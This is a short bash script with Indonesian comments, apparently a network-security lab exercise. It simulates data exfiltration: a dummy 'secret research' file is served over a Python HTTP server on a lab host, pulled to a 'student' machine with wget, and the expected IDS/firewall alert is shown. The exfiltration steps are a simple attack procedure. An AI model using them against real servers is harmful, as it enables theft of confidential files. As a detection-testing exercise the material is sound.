#! /bin/bash

# ACTIONS ON OBJECTIVE (Data Exfiltration)
# Node Attacker: PC Mahasiswa (Pencuri)
# Node Target: Server Riset (Korban yang menyimpan file)

# di pc riset
# 1. Buat file dummy
echo "INI ADALAH DATA PENELITIAN RAHASIA YANG BOCOR" > data_rahasia.txt

# 2. Jalankan web server python di port 80 pada folder saat ini
# (Biarkan terminal ini terbuka selama download berjalan)
python3 -m http.server 80
# Jika python3 tidak ada, coba python -m SimpleHTTPServer 80

# di pc mahasiswa
wget http://10.20.30.10/data_rahasia.txt

# Hasil yang Diharapkan (Di Log Firewall):
[**] [1:20003:1] [ALERT] Data Exfiltration - Transfer File HTTP dari Server Riset ke Mahasiswa [**] ...